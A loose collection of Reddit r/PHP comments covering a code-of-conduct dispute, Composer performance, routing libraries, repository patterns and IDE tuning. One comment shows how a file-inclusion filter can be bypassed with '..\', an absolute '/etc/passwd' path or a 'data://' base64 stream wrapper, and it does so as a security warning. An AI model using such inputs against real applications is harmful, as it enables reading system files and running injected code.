Which as I'm sure you've read from this exact comment chain, I've already touched upon. For one, the law is the last recourse of any society; in a civilized society people do good things because they're the right thing to do, they don't do them because of some overlord watching them with a hammer of justice waiting to come down. In fact it's pretty sad I have to argue this with a *programmer*, since most of us don't source our morality from a fear of retribution by an external, higher authority. For another, a company is just as liable for one of its volunteers breaking harassment law. A person can sue their employer for continuing to employ someone who makes the workplace a hostile one. As such, most if not all employers (including non-profits!) have harassment policies and fire employees (including volunteer employees and pro bono contractors!) who violate harassment law, to *mitigate their liability*. So there's not a lot of logic here.
Please correct me if I've misinterpreted this. &gt; Right, but it ought to be earned by demonstrating the quality of the contribution. Alright, off to a good start. &gt; I don't think anyone is suggesting otherwise, except for the people that think code is the only thing that anyone should ever be judged on when contributing to an open source project. What? Doesn't this contradict the first quote? If the contribution is purely composed of lines of code why should something else come into play? Does it matter if a left handed person wrote this code? No, the quality of the code is entirely detached from things like that. I'm really really struggling to reconcile these two quotes. I'm against doxxing, bullying, exclusion based race and such. But why is it the responsibility of an open source project to play the role of a PC cop? In malicious hands, which are very present and very active, this whole CoC acts as a way to attack individuals whose views don't align with their own. "Their views are different but they're fully within their right to hold and express them. If only I could punish them!" As far as I'm concerned a contribution should be fully detached from the identity of the contributor. Walk in the room, put your contribution on the table, thank you for your time, we'll let you know if we accept it. If you're not breaking any laws, putting anyone in danger, or negatively affecting the project within it's sphere your contribution should be equal among the rest.
Love the package. Thanks for a 2.0 release. We use whoops in dev and it makes life much better for us.
I just don't see why that should be the case. Why does it matter if Billy86 stole a set of shoes from old man McGreggor's shoe store 6 years ago? In no way does that affect the value or content of the contribution.
Or better use [Rapid Route](https://github.com/TimeToogo/RapidRoute) which has a decent API and is faster than FastRoute. 
I had a look at the opencart repo looking for some good drama but don't see much of note. 
You are assuming that there is a missing opening or closing tag. That is not the problem. I can go through the file and replace that structure with print statements instead of opening/closing tags, then move on to the next file and the next file and the next until they are all gone and then the app works. But the app works just fine on the server where it lives without doing anything. All I did was check it out of version control to my own system. My own system runs a different operating system and a different version of PHP. There is probably a setting somewhere that I need to change, or perhaps I need to downgrade PHP. On another app I checked out of version control, I had to change the error settings because there were significant things deprecated between php 5.3 and 5.4 and the errors were too strict by default. This issue I'm having is probably similar to that. The only reason I came here to ask is I couldn't find search terms to get close to an answer. All I could find were things about short tags. I really do not want to edit this app. It works as is where it is and my task is to convert all these old PHP apps into Rails, not rewrite the PHP.
Nothing is "best" in a vacuum. There are reasons. There is a "why". For example, when you produce server-side templates, root-relative links are preferable (i.e. sort of absolute, not really, as absolute would mean starting with the schema), because your routes that expose those templates can change any time and you can't have any "relative stability" with relative links when it comes to one template linking to another (or to an asset). But there you have server-side generation, so you can insert your base URL into the template at runtime. So generating absolute links is easy. On the contrary, you have relative stability and no ability to use server-side generation (well, you have ability, but it's not pragmatic) when it comes to specifying URLs from static assets like CSS, so I tend to prefer relative URLs when a CSS is pointing to an image (which is also in the assets folder), this way I can move my assets anywhere and the CSS URLs still work. So it depends. If no one can explain the reasons behind their opinion, you're free to ignore it, because you won't gain any insight by applying it. Always be asking "why", and demand a good explanation. It separates wisdom from cargo cult, and you'll go far by applying this in your life in general, not just web programming.
&gt; I'm unfortunately having to waste my time doing some weird shit to get these classes under 200 lines, i think a recommended limit definately make sense, or even a soft &amp; hard limit, but a hard limit of 200 lines is practically impossible! It's not impossible. It's impractical and it'd end up reducing readability in some cases, but very possible. Let's say you have class Foo in namespace Bar and it's 201 lines. You can make a namespace Bar\Internal (a typical convention) and offload code in there in many little classes and then create and use instances of those objects in Foo. But doing this for no good reason other than a hard limit is not a way to write good code. It's just a way to work around your boss'es rules. Just the mental burden of having to constantly be aware of how many lines this or that is, so an integration rule (or a manual code review) won't fail your code is infuriating and reducing productivity.
I think most people use FastRoute by writing a wrapper (an adapter) matching their existing router interfaces (that they use in their projects), in which case a wrapper for a wrapper wouldn't make sense, unless that wrapper provides a lot more than being just a wrapper. But it's probably nice for new projects, if someone has no interface to abide by.
I have a feeling a lot of people might be confusing this code of conduct with this absolute [travesty](https://github.com/todogroup/opencodeofconduct/blob/gh-pages/index.md) they were pushing at GitHub, which, among other things, adds *explicit protections* for people engaging in certain types of harassment ("We will not act on complaints regarding ‘Reverse’ -isms, including ‘reverse racism,’ ‘reverse sexism,’ and ‘cisphobia’"). I just read the Contributor Covenant, and it really seems to me like it's just asking people to treat each other with the same courtesy and professionalism that would be expected in the workplace, and it seems pretty clear that it's not placing any expectations on people's actions outside of the project itself. Edit: I wonder if I'm being downvoted for having a problem with the GitHub CoC, or *not* having a problem with the Contributor Covenant.
Do a search for "idiot" in the repo issues. Here are a couple of the more recent-ish outbursts I know of. https://archive.is/V21Eo https://archive.is/ED5oC
I bet Hack came from them writing the HHVM and thinking, boy if we had just added a few things to PHP it'd be easier to optimize for this virtual machine we wrote.
Living in Asia as a white guy i've had racist stuff happen to me all the time. This is a poor decision based purely on American only views of how they think the world runs if it's correct in your link.
Just 1?
Where did I equate criminal harassment with the anecdotes served up by others? Have you made some false equivalency that because I'm arguing in favor of a harassment policy, I must agree with and back every argument made by anyone else who appears to be on my side? I'm not on anyone's side, for one. I don't arbitrarily agree with anyone but myself, for another, and if any of my *own* positions are unclear I'd be *glad* to expound on them. And for a third, it's your choice to make this a discussion about people having their feelings hurt - I never mentioned it. At no point did I say that I objected to their deciding not to implement the *proposed* Code of Conduct. No, I object to their deciding to abandon *any attempt* at a Code of Conduct, and shut down the dialog because a bunch of nutjobs who want to abuse their shaky definition of "free speech" beat them down. That being said, it's frankly abhorrent that an organization like the PHP Group DOESN'T have a harassment policy in place for its contributors. If they have a lawyer *at all*, that lawyer is advising them to have a policy in place for how to deal with harassment among their contributors, or else that lawyer is suffering blood pressure problems trying to convince a bunch of open source coders that these things won't come back and bite them in the ass. As for this proposal that we have to wait until there's a violation before a policy can be put into place, that's honestly suicidally stupid. If I lived in a state where people didn't need licenses to become drivers, I wouldn't go out driving, I'd get the hell out of the state. My solution - and the solution of MANY developers - is not to touch the PHP project or any other open source project that lacks a harassment policy with a ten foot pole. What you and the other vocally opposed and well-entrenched developers fail to recognize is that most of us aren't speaking up - we're just leaving. And while other industries make leaps and bounds forward because of the expanded and innovative workforce of categories who are now entering their fields, open source technology can enjoy the same limited workforce it has for over 30 years.
That makes it a privilege
I have an older CI app. There's a few things you can do to "help" it. 1. Migrate to CI3. Yes, it's still CI, but it's easy to fix the breaking changes, and will keep your app up to date and that's never a bad thing. 2. Refactor your CI classes into regular classes. CI doesn't promote OOP, but there's no reason why you can't convert your app to OOP while working around the CI framework. 3. Unit test your new non-CI based classes. Why not? Unit tests are good, right? 4. Implement a different, more modern templating system and over time convert your views to it. 5. Now, you have a new frontend, your backend is OOP... see where this is going? You might still be using the CI framework, but your app isn't really a CI app, it's more like a PHP app that lives within a CI container. Now, just remove the CI container.
Here's hoping.
&gt; Unfortunately (or not?), these things aren't accepted or not based upon the logical validity of a series of statements they make. But ideally they should. We should strive to be rational and not victims to whims, social pressure etc. I would hate to see issues on php projects that refer to what some contributor said on their social accounts that is not related to the project.
Yeah, [this is a rather extensive list](https://magento.com/security/patches/supee-7405)
Because the thing that takes time in composer isn't the download it's the dependency look up. So in otherwords yay someone made composer 3 minutes faster because it downloads the files in parallel, but it's still going to take 15 mins to solve large complex composer jsons.
Stories like these make me happy I work for myself. These limits are unreasonable, especially the function limit, not being allowed to use traits is weird, are you guys stuck with PHP 5.2 ?
I don't think that is 100% accurate, even after deps are resolved it can take many minutes to checkout them all if you have a significant amount. Also, on a side note, even doing a composer update on and empty project with 0 dependencies takes more than a minute. PS C:\work\temp\composer&gt; Measure-Command {composer update} You are running composer with xdebug enabled. This has a major impact on runtime performance. See https://getcomposer.org/xdebug Loading composer repositories with package information Updating dependencies (including require-dev) Nothing to install or update Generating autoload files Days : 0 Hours : 0 Minutes : 1 Seconds : 21 Milliseconds : 437 Ticks : 814376158 TotalDays : 0.000942564997685185 TotalHours : 0.0226215599444444 TotalMinutes : 1.35729359666667 TotalSeconds : 81.4376158 TotalMilliseconds : 81437.6158
https://getcomposer.org/doc/01-basic-usage.md#autoloading
Composer does not use cURL, so that is not going to happen.
I saw references to this on reddit... I... I thought that was just a joke! And they merge this into the core? Wow.
Something like.. /** * @param array $items * @param array $weights * * @return mixed */ function random_weighted(array $items, array $weights) { $weight = 0; $return = current($items); for ($i = 0, $n = count($items); $i &lt; $n; ++$i) { $random = mt_rand(0, $weights[$i] + $weight); if ($random &gt;= $weight) { $return = $items[$i]; } $weight += $weights[$i]; } return $return; } 
I don't want to be pedantic but in reality is there a difference for this case? I mean the downloads are, as a result, parallelized right?
[removed]
Not sure I follow..? https://3v4l.org/3uiKq
Done. Looking forward to the results!
I've always loved FastRoute but felt the API could be a lot cleaner for the 95% use case. I wrote this code when I was introducing my intern at work to the concept of MVC. I've found it useful in a couple of projects since so last night I tidied it up and open sourced it.
I like it! This is a great! Maybe code could be cleaner and more testable, but it gets the job done, that's what matters. Will use in the next project for sure.
Hmm, sorry I was wrong about that. But I think there is still a flaw. It seems the last item has a higher probability of being chosen: https://3v4l.org/5nsm3 I am assuming this is because you are calling `mt_rand` on every iteration. 
And it doesn't fix the issue, as Leader/Follower translates to Führer/Verfolger, Verfolger practically meaning Stalker, and Führer... well, you get it. There's always at least one social context in which it will be offensive 
Why could this thing happen again? Maybe because the author of the Contributors Covenant is the very same person who did OpalGate?
Because the very people who abuse the Contributors Covenant are the very people who wrote it. OpalGate was done by the original author of the Contributors Covenant.
Am German; "triggered"
Move them into a shared cache server or another redis server for instance. Then have the boxes query from there. If you insist that your "$10 boxes" can't access the central DB or don't want to cross certain boundaries then you will need certain resources in each boundary layer. Sounds like you need a caching server in your Web layer. Especially with the requirement of API up and serving stale date while backend down. That aside, your core approach and hangup about $10 boxes accessing the datastore makes me think you have other problems in this app.
Google is actually quite horrible at returning best practices unless someone else asked about specifically best practices. Google often returns authoritative, old info that recently went out of favor but gets listed in results due to a period of popularitt over and over and over. It's always good to ask the community directly for best practices. 
It's a bit of both. Debian have officially introduced naming convention changes for PHP packages that will facilitate installing multiple PHP versions in the future. However Dotdeb have jumped on the opportunity and allow you to mix the Dotdeb PHP 7 packages with the official Debian PHP 5.6 packages.
I'm confused, I said it saves minutes. But I was pointing out the reason composer is slow is because of the dependency resolving. So which bit isn't 100% accurate?
I am sorry maybe I am naive, but I have been completely satisfied with PHPStorm's auto-completion and type inference. What benefit does your plugin provide that I don't already have access to?
So the follower is just following the leaders orders, nein? So much better than being all about black and white people, which is *always* implied when a slave process is spawned to do some work for the evil master program. *sigh*
I think you misunderstood. Please read more carefully.
There is nothing to be clicked in the task bar. only opening browser. view other videos i hope you may not get the problems in there.
I didn't understand a lot of it, but looks like it offers parsing within strings to get class types, and other areas where phpstorm ignores. Also for example, if you call $this-&gt;getMock("DateTime") in a unit test, it will "know" the return type is Datetime instead of the php unit mock class. 
I find your lack of faith disturbing.
Because, there are a ton of instances that are not patched. 
It can be. A repository is just a collection-like interface that hides a storage backend. Most collections have ways to add, change, and remove things. For what it's worth, I've found having a read-only and a read-write interface works really well. Most clients of the repository only need to read, while a select few will need to read and write and have to request it explicitly. interface SomethingRepository { // find, get, findAll, etc } interface SomethingStorage extends SomethingRepository { // add, update, remove, etc }
i did this yesterday as well. I do look forward to viewing your results :)
I see, I just request EntityRepository for reading and EntityManager for writing when needed. This way I don't need to define extra class for writing as I really don't need it to be extra class.
Phpmailer shows the message "could not send mail" could not tell you exactly, I'm on a bus going to the university. And The mail() just doesnt do anything
thanks for the answer, i'll check that later :) 
Closing PHP tags mid-function isn't especially weird and should work fine. It's often used for templates.
Try installing Magento 2 with the 'composer create-project' command. It takes freaking forever.
Exactly. Look at the list of links posted to this subreddit in the last days: technical stuff, technical stuff, Paul M. Jones, technical stuff, technical stuff, Paul M. Jones, etc.
I don't really understand what it does, even having read the readme page. I love @Haehnchen's other PHPStorm plugins - the Symfony plugin is essential for me. But I don't really get why I would want to use this plugin, or what I could do with it.
You can do something similar using [Faker](https://github.com/fzaninotto/Faker), using the `biasedNumberBetween` provider.
Agreed. You should only ever use relative URLs for quick and dirty pages, because the URLs will break quickly as soon as you have directories in the path. Full absolute URLs have the advantage that if somebody is scraping your content (in a way that you want them to do) then it will still work without them doing anything. For example, RSS readers. Also, if you have links in the content, then whenever it is scraped they will all link back to your original content (good for SEO). But relative URLs are more flexible and convenient. Ideally, use a router which will generate absolute URLs that are correct for the host on which the PHP is being executed, but it's probably not a big deal if you use the short URLs.
The [WriteRepository](https://github.com/nilportugues/php-repository/blob/master/src/Domain/Model/Repository/Contracts/WriteRepository.php) could benefit from less persistence-oriented methods: instead of `persist` and `delete` rather `add` and `remove`. That way it behaves more like a collection. Related: [The repository interface](http://mnapoli.fr/repository-interface/).
Do not use this. If you are using this on a website, you should remove it straight away. Proof of concept: https://3v4l.org/AQDkf Edit: The associated twitter account @ramal_h bio "Web application security researcher,also web developer". I think he's trolling. I hope he's trolling.
You're filtering out `../` but, on Windows, PHP accepts `..\` as well. Not like you need either since you can feed the full path into it as well. eg. `/etc/passwd`. You can also make use of stream wrappers. eg. `include 'data://text/plain;base64,' . base64_encode('echo hello, world!');`.
i have created the other videos in 720P. but the first few videos dimensions are a bit changed. i will consider it. thank you.
Shit, this is like every 6 months now.
This code is not safe for production
My guide to file inclusion: Generally you want to use `require_once`, e.g. `require_once "foobar.php";` Concatenate `__DIR__` if you need to include a file relative to this file's directory, e.g. `require_once __DIR__ . "/vendor/autoload.php";` For templates and other things which you might need to include multiple times, use just `require`. Use `include`(`_once`) if you don't know for sure if the file exists and want to handle it gracefully. Never include files you don't control (e.g. remote URLs). Never include filenames you don't control. Both are severe security issues.
Well does the hard limit include empty lines and docblock comments, or just the lines of actual PHP code? In my experience, more than half of my classes are over 200 lines because the docblock comments themselves are already over 200 lines. On average, 2/3 of the lines in my classes are docblock comments, only 1/3 are actually code(so 70 lines of code means 140 lines of docblock comemnts, which makes 210 lines in total already). If the hard limit include docblock comments, for me this is impossible. Otherwise it may be doable, but still in some edge cases you will have to design your class a bit awkwardly. 
I can't say I have had many problems... but most of my dev machines are pretty beefy... 16GB ram and a quad core. For maximum performance SSD seems to make phpstorm open immediately, instead of the 30s to minute loading time.
I always namespace my code just out of pure habit. It's a great way to contain logic in theoretical containers.
I did that is why I posted my question lol.
It doesn't *make* requests in parallel, but unless you have multiple NICs then that's not going to mean very much as your connections will be interleaved anyway.
you don't have to write "use" at all, you can use full qualified names, and either way (with use or without) usually the autocompletion of a proper IDE will take care of it for you.
I like it. I'll take some ideas from your post... I can easily adopt them. Thanks mnapoli :)
You can autoload your classes at the root namespace if you want. It's not the preferred way to do it, but it's your project, you are the one who has to code it. You're going to have to use "use" to bring in any 3rd party code which is namespaced so you don't really gain that much by omitting the need to use "use" on your own classes. You sound like someone who doesn't have much experience programming. In nearly every project I've ever worked in, in multiple languages and disciplines, you have to cite your included libraries at the top of every file/module. This is pretty much the status quo and for good reason; because if you can't look at a program, and know immediately everything that its execution depends on, you're going to have a rough time figuring that stuff out down the road.
We're talking about open source. Also, "subtle harassment" is an oxymoron. You might've been looking for "discrimination", though even that is a tenuous assertion. You're also being extremely sexist, claiming that men are generally less competent than women. Cut that shit out. It makes you look like a really bad person. Provide evidence that this community actually needs a code of conduct, or stop arguing that it does. Don't move the goalpost and try to squirm out of the burden of proof. You're not convincing anyone otherwise.
&gt;That's true of the Contributors Covenant, but not necessarily true of all CoCs . Its wholly irrelevant when any suggestions for another CoC are dismissed immediately or put aside as something to consider, but not really considered. I think that a CoC has nothing to do with this proposal, pushing the contributor covenant is specifically the goal.
And Twitter isn't representative of the PHP community as a whole, either. I'd like to say that the majority is somewhere in the middle, but by virtue of this being a polarizing issue, I suspect that the majority is split on both sides of this issue, with vocal people from both sides saying the most. You'd be foolish and intellectually dishonest to dismiss the arguments made here. Unless you're going to claim that everyone here is completely irrational, you have to come to terms with the fact that a great number of skilled, compassionate, and involved people are diametrically opposed to these sorts of proposals.
https://github.com/LinioIT/input (Validation + Hydration) https://github.com/auraphp/Aura.Input (Validation)
&gt; How is an `array&lt;string, ...&gt;` going to work when PHP turns string array keys into integers if they happen to look like integers? Per the RFC, type-checking and conversion of scalar keys will be consistent with type-checking and conversion rules in general, e.g. depending on the `strict_types` declaration. &gt; I'm very impressed that generics are being considered for PHP This RFC hasn't even been submitted yet, so it's not being considered yet, and we don't know yet whether anyone on internals is going to even take this seriously ;-) 
If PHP were to support generics, documentation generators would no doubt adapt pretty quickly to support generic syntax. Your existing code doesn't use generic arrays, so there's no inconsistency per se - that is, `int[]` is an untyped array documented as containing int values, as opposed to `array&lt;int&gt;` which would indicate a generic array. They're conceptually the same thing, an large interchangible, but you would likely want to refactor your code to use generic arrays, at which point you should update the documentation. That seems reasonable to me. 
I too never had any performance issues with PHPStorm. Also, the accepted answer is basically "to make your IDE faster, disable all features that make it an IDE and turn it into a basic text editor". Answer #2 though probably does something nicer.
As argued in the RFC, Hack has type annotations only, no type-checking - this is inconsistent with how type-hints work in PHP, and it's inconsistent with a reflective language. What this RFC proposes is very different from Hack. PHP permits generic type relationships, and PHP code is already full of them, therefore it's useful - if you don't care, nobody will force you to use them, just as nobody forces you to type-hint arguments or function return-types today. Type-hinting is optional, and type-hinting in more detail with generics is, of course, optional - such is the nature of PHP. That doesn't mean it's not useful.
That's awesome! One thing I had some pretty serious performance problems with was using the go plugin for intellij. And I have a super core i7 with more RAM than a thousand head of male sheep. But that's neither here nor there, for I blame the author of the plugin.
having it cut of "interface" in variable names with the completion alone seems worth it ;) 
Awesome, thanks!
Awesome, thanks!
I don't know what you mean by "won't work on functions"? The RFC proposes generic classes and type-hints, as well as generic functions.
&gt; And Twitter isn't representative of the PHP community as a whole, either. I never said it was representative. When comparing /r/PHP to other communities, Twitter wasn't even the one on my mind. &gt; You'd be foolish and intellectually dishonest to dismiss the arguments made here. I'm not dismissing the arguments. I'm saying that /r/PHP appearing to be overwhelmingly anti-code of conduct is not necessarily representative of the PHP community as a whole. &gt; Unless you're going to claim that everyone here is completely irrational, you have to come to terms with the fact that a great number of skilled, compassionate, and involved people are diametrically opposed to these sorts of proposals. Sure, there's a lot of people who disagree with the idea of a code of conduct. I'm not denying that. There's also a lot of people who agree with the idea of a code of conduct, who, also, are not "completely irrational". I'm not denying that either.
Sorry, I was making a different argument than that, but I realize it wasn't clear. Reddit is a place that people go to talk. We're not a cohesive group with a united position. Many people have stated that they're pro-CoC, and many have stated that they're anti-CoC, and everyone has different reasons for being that way. I've heard many people state that reddit is "toxic", and some seem to be insinuating that the people voicing anti-CoC positions are either not members of the PHP community (coming from other subreddits, as you say), or are somehow poisoned by reddit's culture. I really resent the implication that my opinions are not my own. Yes, I draw my information primarily from reddit, but I've developed my positions primarily from my own life experiences. Please don't marginalize me. This might not be the point you're trying to make, but it's how it comes across.
is it a Hemi
What are you calling a lot of RAM? We had a couple of devs try it, but it swapped continuously even with 16 GBytes. Laptops with more RAM than that are very expensive.
&gt; We're not a cohesive group with a united position. Many people have stated that they're pro-CoC, and many have stated that they're anti-CoC, and everyone has different reasons for being that way. Sure. &gt; I've heard many people state that reddit is "toxic", and some seem to be insinuating that the people voicing anti-CoC positions are either not members of the PHP community (coming from other subreddits, as you say), Most of the participants are from the community. That said, some of the activity, at least in the first thread, was suspicious. There were 17 accounts that had recently posted in GG-related subreddits, 10 of which had never posted a comment in /r/PHP before, and 12 that posted more heavily in GG-related subreddits than they did in PHP. There were also 20 accounts that had never commented in other programming subreddits. And most significantly: out of the 10 people with the highest comment karma in the thread, 7 of them had never previously commented in /r/PHP. That's not to say things are completely unrepresentative, but things have been skewed somewhat. &gt; or are somehow poisoned by reddit's culture. I really resent the implication that my opinions are not my own. Yes, I draw my information primarily from reddit, but I've developed my positions primarily from my own life experiences. I'd say reddit's culture can be poisonous to a degree, but a larger factor would be that people who aren't fond of reddit's culture are likely to avoid the site. The flip-side is true as well: people whose views coincide with those of people on reddit are more likely to use reddit. &gt; This might not be the point you're trying to make, but it's how it comes across. Oh, not at all. I don't want to suggest that people don't believe these things. I just think the proportions aren't representative. As to quite how unrepresentative it is, I have no idea.
I've asked the admins twice now to look into whether there is brigading here. They have investigated twice, and twice confirmed that there is not brigading going on. You seem to be overly concerned with who is talking instead of what they have to say. It doesn't reflect well upon you.
&gt; Its wholly irrelevant when any suggestions for another CoC are dismissed immediately or put aside as something to consider, but not really considered. Then that's a problem that needs to be addressed with individuals who dismiss and/or fail to consider the alternatives. &gt; I think that a CoC has nothing to do with this proposal, pushing the contributor covenant is specifically the goal. I don't see very many folks continuing to argue for that particular CoC. Even the author of the original RFC was open to alternatives.
If you are running ubuntu/debian, ondrej has released his multiversion repository in a stable version. sudo add-apt-repository ppa:ondrej/php sudo apt-get update sudo apt-get install php7.0-fpm sudo apt-get install php5.6-fpm Then you configure whatever version you want on your nginx/apache virtual host.
Yea answer #2 was the real hero. #1 is fine - if you never use a particular language, you can disable it.
&gt; I promise you, it's not. Reddit's administration has become hysterical about brigading, and have presumably developed tools to identify anything that even seems to be non-organic traffic. They have, for instance, identified individual votes cast by a user as being illegitimate, and removed those from comment scoring. That's pretty damned broad, if you ask me. They've done that sort of thing for a long time, but yes, I see your point. &gt; I'm not sure how the beliefs of the people commenting here should have any bearing on whether they're representative of the PHP community. Your above comment seemed to try to "other" commenters here for having also participated in "GG-related" subreddits. What the hell does that even mean? Beliefs *on their own* mean nothing, sure. However, if people have never commented here before and spend most of their time in such subreddits, it suggests brigading. &gt; The people commenting here are doing so because they have an interest in PHP, or an interest in the topic of codes of conduct, or are generally just interested in the politics of technical communities. All of these are valid positions from which to present one's views. Sure. &gt; These views should not be suspect simply because they're at odds with your own. I don't consider them suspect merely for disagreeing. In fact, I don't consider anyone's *views* suspect, that's besides the point. I am questioning whether the groups of people expressing those views, and the proportions of them, are representative of the community.
Yes. If you don't learn how to program, all you'll ever be able to write is boilerplate code that does nothing. You'll never end up making applications, OO or not.
Ha, I'm afraid you're right. Thanks for that link!
&gt;if people have never commented here before and spend most of their time in such subreddits, it suggests brigading. It doesn't, though. It suggests interest. They've come here with an interest to consider what's said, and to participate in the discussion. Brigading would be if someone posted a link to here in one of the popular political subreddits or on Twitter and suggested that those whose beliefs align with theirs should attempt to derail/skew the discussion. That does not seem to have happened. People are having in-depth discussions and making great points. I have not seen this conversation unfairly skewed toward either side, and I've been watching *very closely*, as a moderator here. What factors decide whether someone is representative of the wider community? I can't think of any. Is that decided by their use of PHP? Does it matter if they use PHP as a hobbyist or professional? Does it matter if they are active in the community on other topics? Do they need a vested interest in PHP's development as a language? My objection is to your continued attempts to *discredit* others here. It sounds like a strong word, but that's the most accurate one I can think of for what you're trying to do. You're trying to dismiss the views expressed here for whatever reason, instead of engaging them honestly and with respect. I don't think I'm being unfair to accuse you of that, either.
Since redis is just acting as a caching layer, like memcached, in front of your canonical database, you should treat it as such. Those are still one application, not separate services, but you can send reads to the cache while sending writes to the database. The standard approach is to have statically defined lifespans on your cache, and to fall back to a get-and-set if the key doesn't exist (has expired). As an alternative, you can go with a [generational caching](http://www.regexprn.com/2011/06/web-application-caching-strategies_05.html) method, which is closer to what you're doing now. &gt; If API goes down, it doesn't matter at all for APP. Someone has to recover API and that's it. It does matter, because you're operating off of outdated data. It just may be an acceptable degradation for a short period of time. &gt; API consists of hundreds of small nodes. I cannot go and create a cron service on each box, configure or monitor them. They simply listen. What kind of service are you using where you can't configure your servers at all? &gt; Also, I can't give database access to $10 nodes. Good architecture or not, giving database access to a crappy $10 box is not a good practice in terms of security. I don't see any connection between the price of the server and how secure it is. Your servers' security is dependent on how you've configured them and how you monitor them. ---- I do understand how time requirements and business needs get in the way of making the changes you would make if you had infinite time and resources. You'll have to figure out for yourself what level of change you can get away with, but I'd recommend either a queueing system or a binary protocol (I mentioned a few in my original post) for the time being, and some serious effort into convincing management that this is a problem that will need to be addressed sooner rather than later.
Agreed.
We use forms with API on https://github.com/sylius/sylius/, works pretty good.
Good question. Who's pushing the current CoC RFC? Go ask them.
&gt; You just simultaneously stated that you think that people not representative of the community are unfairly skewing the discussion, but you have no clear criteria for who qualifies as being part of the community. &gt; I'd suggest you should figure out what you're complaining about before doing so. What I actually said was I don't know whether someone is *representative* of the wider community. That's not the same question. And no single person is representative anyway. That's something you can only apply to a group. I've already said who I'm suspicious of: reddit users who only started commenting in /r/PHP once the code of conduct discussion happened, and who are members of subreddits that linked to the code of conduct discussion, which suggests they were brought here by those subreddits. There were quite a few of those, and they skew the discussion by participating.
I saw the same on a new-ish MacBook Pro too. I want to say I saw better performance around when version 9 or 10 came out. One thing I found helps was increasing the JVM heap size and keeping the code locally, at the time I kept my work on a box mounted with sshfs, which really slowed the works up.
God damn it. Thanks for reminding me :D *edited the original post*
Why have you moved cache value serialization/deserealication into cache consumer not to cache itself?
&gt; when meditation failed. I think you meant mediation, but picturing an Internet troll being forced to learn to meditate is pretty hilarious.
I don't think I ever thought of putting the serialization/deserialization into the cache itself, in the spirit of its name: *SimpleCache*. But I see there might be a good reason to do it that way and have the cache handling all sorts of types as data to be saved.
If you have a JSONSchema for your data you could also use http://phpsx.org/ which automatically validates the data accordingly
yeah mine runs fine with 3 projects running, a vm, and an iOS simulator with 8gb ram
I also look forward to the results
In this case you have to at least define type for value argument as string :)
&gt; You're suggesting brigading, but I've already cleared that up. It depends what you call "brigading". By your definition I'm not quite sure if what I'm describing counts. &gt; Unless it's being done in private using links without referrers, it's not happening. Unless you have evidence of this, I'd suggest you stop bringing it up. It's not constructive. I do have evidence. I looked at the histories of some of the commentors in the original thread and saw people who only started contributing to the subreddit once the code of conduct discussion happened. That was just a cursory look by manually looking through profiles. I could go and do a proper look, if you want me to. Randi Harper [did a more sophisticated analysis using automated tools](https://twitter.com/randileeharper/status/684924636388171777). If you don't trust her results, I could go and try to reproduce them myself using the reddit API. You could, even. &gt; Your objection would seem to be that the general consensus among the PHP community deviates from what you think it is based on your worldview. Please stop misrepresenting my position. My position is that /r/PHP is only a subset of the PHP community as a whole, and as such not necessarily representative of the opinions of the wider PHP community. Furthermore, the code of conduct discussion in /r/PHP appears to have been subject to some degree of brigading /r/PHP is not the PHP community, it is a subset. Twitter is not the PHP community, it is a subset. PHP internals is not the PHP community, it is a subset. Stack Overflow is not the PHP community, it is a subset. None of these is singularly representative of the wider community. Even in concert, they may not be. There's more than four PHP sub-communities. &gt; You would seem to be looking for reasons after the fact to support this discrepancy in your mind. After the fact? Before the discussion even happened, I predicted brigading would happen, because it tends to happen when this issue and similar ones come up in open-source projects. &gt; There is no conspiracy. There are simply people who disagree with you. Get over it, please. I'm not alleging a conspiracy - though I do think there was some, limited brigading. I understand people disagree with me. I recognise that, even without brigading, /r/PHP might be overall against the code of conduct - I'd accept it, even though I wouldn't like it. That is not my point. My point is that we cannot consider subsets of the community to be equal to the entire community. My point is that brigading can skew the views of this specific community. Do you recall what I originally said, at the top of this thread? Do you recall what I was replying to? Let me remind you. A commenter said: &gt; Maybe it's because most of the community agrees that a CoC is silly? And I said: &gt; That's not necessarily the case. For one, reddit is not representative of the PHP community as a whole. For another, people won't necessarily voice their opinion here if it's going against the perceived grain. &gt; Also, because we're on reddit, the discussion is at least partly influenced by other subreddits. What I was saying was very simple: reddit might think one thing, but reddit isn't the entire PHP community, so you can't simply say "most of the community agrees that a CoC is silly". In fairness, the commenter wasn't necessarily equivocating reddit and the community, but I took it that way and that's what spawned the discussion. I also said that people don't always voice their opinions, which you've acknowledged: discussions tend to be dominated by the loudest voices. A loud minority can make it look like something is a popular view, even if it isn't. And finally, I said that their appeared to be *some* influence from outside the subreddit on what happened in /r/PHP. That was all I said. I didn't say that reddit is entirely unrepresentative. For all I know, it might be completely representative, though I doubt given past experience. I didn't say that there's a conspiracy to make reddit be completely anti-code of conduct.
ssd &amp; 8gb ram here. 2nd gen i7, 2 large projects open. phpstorm uses about 2-3gb ram performs fine.
Object-oriented and procedural code aren't these totally separate things. Classes are a layer on top of "procedural" concepts after all: an object is a set of variables and functions. OOP doesn't replace procedural code, it encapsulates it. Also, your classes will inevitably have to deal with some "procedural" APIs and such.
In my desktop it takes up to 1 second to open a menu. The 2 fix it made the scroll faster. better than nothing 
Love the smart quotes in those "code" blocks. You might want to fix that.
&gt; Be excellent to each other You know, I was being a *little* flippant with "don't be a jerk", but I actually like "Be excellent to each other" better. It's an actual positive statement about what someone *should* do, rather than just a negative of what not to do. And as we know, many OSS people are, shall we say, a little socially oblivious. "Hey, follow the 'don't be a jerk' rule! That statement was kind of jerkish." "How am I jerk... I don't understand!" ...vs... "Hey, follow the 'be excellent to each other' rule! Was that statement really being excellent?" "Well, I guess there's room to be more excellent." It's asking someone to improve, rather than making a value judgment. I like it.
Is the only way to hydrate a single stdClass is to pass it as an array and call first in Laravel 5 eloquent? It seems when I call first using the query builder returns an stdClass even though I'm accessing the query builder directly from the model itself using: `$this-&gt;eloquent_class-&gt;query()-&gt;getQuery()` &amp;nbsp; Example of what I'm talking about: `$this-&gt;eloquent_class-&gt;hydrate([$object])-&gt;first();`
And this is why the future of Bill and Ted is such a utopia. The whole society lived by that credo. Someone should submit an RFC or whatever to propose this as a solution to the problem.
Yes I received that yesterday, but thank you for posting it. The problem I see is that removing the name "contributor covenant" while retaining most if not all of its vague and problematic text by distributing it throughout [this](https://github.com/derickr/php-community-health/blob/master/code-of-conduct.rst) document isn't really changing anything, they are just calling it something different. We will see what happens.
You observed competent women, and then used that to generalize all men as less competent than women. If you didn't mean exactly that, then you chose your words extremely poorly. If you did mean that, then you're making sexist claims based purely on your own anecdotal evidence. If you're going to be bigoted, don't be surprised when you're called out as a bigot.
I solved the problem by never using OpenCart. There are way more issues with the code than the maintainer.
